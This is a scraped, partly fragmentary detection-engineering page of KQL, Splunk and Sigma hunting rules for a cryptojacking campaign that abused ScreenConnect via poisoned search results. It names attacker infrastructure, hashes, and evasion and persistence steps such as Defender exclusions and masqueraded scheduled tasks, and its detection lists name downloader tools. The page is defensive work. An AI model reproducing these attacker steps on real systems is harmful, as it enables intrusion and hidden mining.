        | where SHA256 in~ ("1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8", "b0cefb66b953e5184b6adb3035e9e267335ac5eabfe1848e07834777b9397b74", "e7347d90653efc565f03733a95e9209d78f9cfa81e31ff2b2dd9d48d75a4b8b1", "43f2b001846c4966073ebffa5be8f15e491a1e7d32bbd805d57406ff540e0dd9", "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2", "ba642fe2c7c65e42dd7f6444b83023dc6827e08c", "acfc3f957a63b4cde93ff645f2b6bf26a8ed1bbf") or SHA1 in~ ("1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8", "b0cefb66b953e5184b6adb3035e9e267335ac5eabfe1848e07834777b9397b74", "e7347d90653efc565f03733a95e9209d78f9cfa81e31ff2b2dd9d48d75a4b8b1", "43f2b001846c4966073ebffa5be8f15e491a1e7d32bbd805d57406ff540e0dd9", "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2", "ba642fe2c7c65e42dd7f6444b83023dc6827e08c", "acfc3f957a63b4cde93ff645f2b6bf26a8ed1bbf") or MD5 in~ ("1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8", "b0cefb66b953e5184b6adb3035e9e267335ac5eabfe1848e07834777b9397b74", "e7347d90653efc565f03733a95e9209d78f9cfa81e31ff2b2dd9d48d75a4b8b1", "43f2b001846c4966073ebffa5be8f15e491a1e7d32bbd805d57406ff540e0dd9", "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2", "ba642fe2c7c65e42dd7f6444b83023dc6827e08c", "acfc3f957a63b4cde93ff645f2b6bf26a8ed1bbf")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents

ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-45321")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-45321")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

union

        | where Timestamp > ago(7d)

        | where SHA256 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or SHA1 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or MD5 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or SHA1 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or MD5 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,

// Pre-filter both ASIM tables before the union — same pattern as the

let BadHashes = dynamic(["ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b"]);
union

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-8398")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-8398")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-8398")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-8398")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("38.180.107.76") or RemoteUrl has_any ("env-check.daemontools.cc")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["38.180.107.76"]);
let BadDomains = dynamic(["env-check.daemontools.cc"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:
    - https://attack.mitre.org/tactics/TA0011/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
        DestinationHostname:
            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'
    condition: selection_ip or selection_domain
falsepositives:
    - None on a true-positive IOC match
level: critical
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("38.180.107.76")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats `summariesonly` count from datamodel=Web
        where Web.dest IN ("env-check.daemontools.cc")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats `summariesonly` count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("env-check.daemontools.cc")
        by DNS.src, DNS.query, DNS.answer
     | `drop_dm_object_name(DNS)`]
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("38.180.107.76")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats summariesonly=false count from datamodel=Web
        where Web.dest IN ("env-check.daemontools.cc")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats summariesonly=false count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("env-check.daemontools.cc")
        by DNS.src, DNS.query, DNS.answer
     | `drop_dm_object_name(DNS)`]

union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),

        | where ActorUsername !endswith "$"

title: File or Process Matching Article Hash IOCs

status: experimental

    values. Use a watchlist or external indicator file for management
    at scale.
references:
    - https://attack.mitre.org/techniques/T1027/

tags:
    - attack.t1027
    - attack.defense-evasion

    category: process_creation
    product: windows
detection:
    selection:
        Hashes|contains:
            - 'SHA256=__HASH_PLACEHOLDER_REPLACE_ME__'
    condition: selection
falsepositives:

level: critical

From poisoned search results to GPU mining: A cryptojacking campaign abusing ScreenConnect and Microsoft .NET utilities

Microsoft Security Blog
2026-05-26 21 use cases 11 techniques 6 kill-chain phases detected

Microsoft exposes a cryptojacking campaign using SEO poisoning and ScreenConnect to target high-performance PCs, with malicious sites also surfaced through AI chatbots. The post From poisoned search results to GPU mining: A cryptojacking campaign abusing ScreenConnect and Microsoft .NET utilities appeared first on Microsoft Security Blog .

Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] ZIP delivery from gleeze.com look-alike utility download sites (SEO/AI poisoning) · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender

Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Unauthorized ScreenConnect client beaconing to directdownload.icu:8041 / 193.42.11.108 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains

[LLM] ZIP delivery from gleeze.com look-alike utility download sites (SEO/AI poisoning) Delivery High
Hunts browser-initiated ZIP downloads whose origin URL is a subdomain of the campaign's Dynu-hosted gleeze.com infrastructure (e.g. direct-download.gleeze.com/crystaldiskinfo). This is the initial-access foothold for the cryptojacking chain that impersonates CrystalDiskInfo, HWMonitor, FurMark, DDU, K-Lite and PDFgear. Rationale: Anchors on the article's named distribution infra (gleeze.com subdomains, directdownload.icu) corroborated by an ANY.RUN run of direct-download.gleeze.com/crystaldiskinfo and gbhackers/The Register reporting; 150+ subdomains all funnel the same ZIP, so the parent domain is a stable pivot. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://any.run/report/6468f63767212e0c1e4fe5d0eaa9137c4547ff173dc55b2d7fb1b2e445802d45/48172448-8ac9-4c17-8fef-bbf0c9a3d1e3 • https://www.theregister.com/2026/04/10/cpuid_site_hijacked/

[LLM] DLL side-loading of autorun.dll by spoofed hardware-utility executables Installation High
Detects the legitimate (but trojanized-bundle) utility binaries — CrystalDiskInfo, HWMonitor, FurMark, DDU, PDFgear, K-Lite — loading a malicious autorun.dll from a user-writable folder via DLL search-order side-loading. Nine distinct autorun.dll variants were observed across the campaign; the module name + non-system host pairing is the high-fidelity signal. Rationale: Uses the exact malicious module name (autorun.dll) plus the article's enumerated host utilities; the image-load relationship from a user-writable path distinguishes side-loading from normal program startup. Datadog/Falcon use the autorun.dll file-write as a proxy since their FDR/Sysmon image-load fields aren't in scope here. Sentinel left blank: no standard Sentinel table carries Sysmon EID 7 image-load metadata in this tenant. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://cyberpress.org/seo-attack-deploys-rmm/

[LLM] msiexec silently installing masqueraded vcredist_x64.dll (ScreenConnect packaged installer) Installation High
Detects autorun.dll's second stage: msiexec.exe silently installing a DLL named vcredist_x64.dll that poses as the Visual C++ Redistributable but is actually a packaged ScreenConnect (ConnectWise Control) installer. The DLL-as-MSI-payload plus silent flags is the article-specific behaviour. Rationale: Anchors on the verbatim payload name vcredist_x64.dll passed to msiexec — a DLL is never a normal MSI target, making this near-zero-FP. Corroborated by gbhackers ('Microsoft Binary to Install RMM Tool') and cyberpress describing msiexec/MSI abuse to deploy the RMM. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://cyberpress.org/seo-attack-deploys-rmm/

[LLM] Unauthorized ScreenConnect client beaconing to directdownload.icu:8041 / 193.42.11.108 Command & Control High
Detects the abused ScreenConnect.ClientService.exe launched with the attacker's relay parameters (h=directdownload.icu, p=8041, session GUID b31c5795-9b66-4d20-ac8d-aad60d05852a, c=Crystaldeskinfo) or beaconing to C2 IP 193.42.11.108. This establishes the persistent remote access that could pivot to data theft or ransomware. Rationale: Uses the verbatim ScreenConnect service-invocation string from the article (relay host directdownload.icu, port 8041, exact session GUID, Crystaldeskinfo custom property) — these are unique to the attacker tenant, so any match is a confirmed compromise; the C2 IP 193.42.11.108 provides a network corroborator. Cross-checked against: • https://www.scworld.com/brief/malware-crafted-through-connectwise-screenconnect-exploitation • https://gbhackers.com/seo-poisoning-attack/

[LLM] SimpleRunPE / RuntimeHost.exe dropped to hidden D3F4E2A1 install folder Installation High
Detects the process-hollowing dropper (SimpleRunPE.exe, SHA256 1b2555b0...) and its self-copy RuntimeHost.exe written into the campaign's hidden install folder keyed by identifier D3F4E2A1 (incl. fallback %LocalAppData%\Microsoft\Windows\Caches\D3F4E2A1). Also pivots on the embedded PDB string and the C2 IP-resolved binary hash. Rationale: Combines the article's campaign identifier D3F4E2A1 (used as folder name, mutex Global\D3F4E2A1_Svc, and exclusion path), the dropper/persistence filenames, and the verbatim SHA256 — all unique strings that won't collide with legitimate software. PDB path (Simple-RunPE-Process-Hollowing-RUNPE) ties to the public PoC fork. Cross-checked against: • https://github.com/Watermwo/Simple-RunPE-Process-Hollowing • https://malware.news/t/from-poisoned-search-results-to-gpu-mining-a-cryptojacking-campaign-abusing-screenconnect-and-microsoft-net-utilities/107339
ATT&CKT1055.012 T1564.001 T1036.005
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where (FileName in~ ("RuntimeHost.exe","SimpleRunPE.exe"))
     or (FolderPath has "D3F4E2A1")
     or (SHA256 == "1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5")
| where FolderPath has_any (@"\Caches\", @"\AppData\", @"D3F4E2A1") or FileName in~ ("RuntimeHost.exe","SimpleRunPE.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName in~ ("RuntimeHost.exe","SimpleRunPE.exe")
     or TargetFilePath has "D3F4E2A1"
     or TargetFileSHA256 =~ "1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5"
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, TargetFileSHA256, ActingProcessName
| order by TimeGenerated desc

[LLM] Defender exclusion added via Add-MpPreference for campaign install path Installation Medium
Detects the defense-evasion step where the malware runs PowerShell with -NoProfile -NonInteractive -ExecutionPolicy Bypass to call Add-MpPreference -ExclusionPath, carving out its hidden D3F4E2A1 install location from Microsoft Defender scanning. Flags the exclusion-add behaviour, prioritising command lines that reference the campaign's Caches\D3F4E2A1 path. Rationale: Anchors on the article's verbatim PowerShell evasion command (Add-MpPreference -ExclusionPath with -NoProfile -NonInteractive -ExecutionPolicy Bypass) and boosts confidence when the exclusion path references the D3F4E2A1 / Caches install location. Kept as hunting because legit admins occasionally add exclusions. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/
ATT&CKT1562.001 T1059.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ProcessCommandLine has "Add-MpPreference" and ProcessCommandLine has "ExclusionPath"
| extend HighConf = ProcessCommandLine has_any ("D3F4E2A1","Caches")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine, HighConf
| order by HighConf desc, Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\powershell.exe" or NewProcessName endswith "\\pwsh.exe"
| where CommandLine has "Add-MpPreference" and CommandLine has "ExclusionPath"
| extend HighConf = CommandLine has_any ("D3F4E2A1","Caches")
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, CommandLine, HighConf
| order by HighConf desc, TimeGenerated desc

[LLM] Cryptojacking persistence: Run key WinSysCache Installation High
Detects creation of the campaign's machine/user Run-key persistence value named WinSysCache under CurrentVersion\Run, which re-launches the hidden RuntimeHost.exe miner/loader at logon. [LLM] Cryptojacking persistence: 'Windows System Health' scheduled tasks Installation High
Detects creation of the campaign's masqueraded scheduled tasks — 'Windows System Health' (logon), 'Windows System Health Monitor' (boot +1h), and 'Windows System Health Check' (every 5 min) — all running with highest privileges to relaunch the miner/loader. These exact task names are campaign-specific. Rationale: Uses the three verbatim task names from the article's persistence table ('Windows System Health', '... Monitor', '... Check'); these names plus highest-privilege triggers are unique to the campaign and don't match any genuine Windows task. Defender query covers both schtasks.exe execution and the ScheduledTaskCreated telemetry for API-created tasks. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/
ATT&CKT1053.005
Data sourcesEndpoint.Processes
union
(
  DeviceProcessEvents
  | where Timestamp > ago(30d)
  | where FileName =~ "schtasks.exe"
  | where ProcessCommandLine has "/create" and ProcessCommandLine has "Windows System Health"
  | project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, Detail=ProcessCommandLine
),
(
  DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType == "ScheduledTaskCreated"
  | where AdditionalFields has "Windows System Health"
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, Detail=AdditionalFields
)
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4698
| where EventData has "Windows System Health"
| project TimeGenerated, Computer, SubjectUserName, EventData
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07
status: experimental
description: |

logsource:
    category: process_creation

            - '\excel.exe'
            - '\powerpnt.exe'

            - '\mspub.exe'
            - '\visio.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'

            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'

    condition: selection_parent and selection_child
falsepositives:

level: high

